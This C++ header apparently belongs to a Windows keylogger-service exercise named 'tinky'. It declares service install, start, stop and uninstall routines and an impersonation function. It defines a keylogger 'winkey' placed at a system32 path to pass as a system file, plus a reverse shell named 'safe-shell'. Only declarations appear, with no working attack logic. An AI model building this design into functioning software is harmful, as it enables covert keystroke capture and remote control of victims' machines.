#pragma once

#define UNICODE
#define _UNICODE

#include <iostream>
#include <windows.h>

// =============== Magic variables ========== //
#define PROCESSES_STOP TEXT("Global\\stop_tinky_processes")  // NameSpace Global ?
#define SVC_NAME TEXT("tinky")
#define SVC_EXE_NAME TEXT("svc")
#define KYLG_NAME TEXT("winkey")
#define RSHELL_NAME TEXT("safe-shell")
#define HIDING_PATH TEXT("C:\\Windows\\system32\\winkey.exe")
#define GEN_HIDING_PATH TEXT("C:\\Windows\\system32\\")
#define FUNCTION_COUNT 4
// global {
#define NO_NAME NULL
#define NONE 0
#define FAILURE 0
#define SUCCESS 1
// }

// ============================================= //

// =============== Structs =============== //

typedef struct tinky {
	// install {
	SC_HANDLE	scmHandler;
	SC_HANDLE	serviceHandler;
	// }

	// Global {
	char	*winkeyExePath;
	char	*tinkyExePath;
	// }

	// start {
	SERVICE_STATUS			svcStatus;
	SERVICE_STATUS_HANDLE	svcStatusHandle;
	// }

	// eventhandle { 
	HANDLE					tinkyStopEventHandle;
	// }

	BOOL	onDelete;
}	tinky_t;
// ============================================= //

// =============== process.cpp =============== //
BYTE launchProcesses(DWORD dwNumServicesArgs, LPWSTR *lpServiceArgVectors);
// ============================================= //

// =============== serviceControlManaged =============== //
void sendStatus(DWORD currentState, DWORD ctrlsAccepted);
int startedBySCM(void);
// ============================================= //

// =============== cmdLineControlManaged.cpp =============== //
BYTE initControl(void);
// ============================================= //

// =============== impersonate.cpp =============== //
BYTE impersonate(void);
// ============================================= //

// =============== install.cpp =============== //
int openSCM(DWORD desiredAccess);
int install(void**);
// ============================================= //

// =============== start.cpp =============== //
int start(void **args);
// ============================================= //

// =============== stop.cpp =============== //
int stop(void**);
// ============================================= //

// =============== delete.cpp =============== //
int uninstall(void**); /* delete() was taken..lol */
// ============================================= //

// =============== delete.cpp =============== //
void cleanUp(void);
// ============================================= //
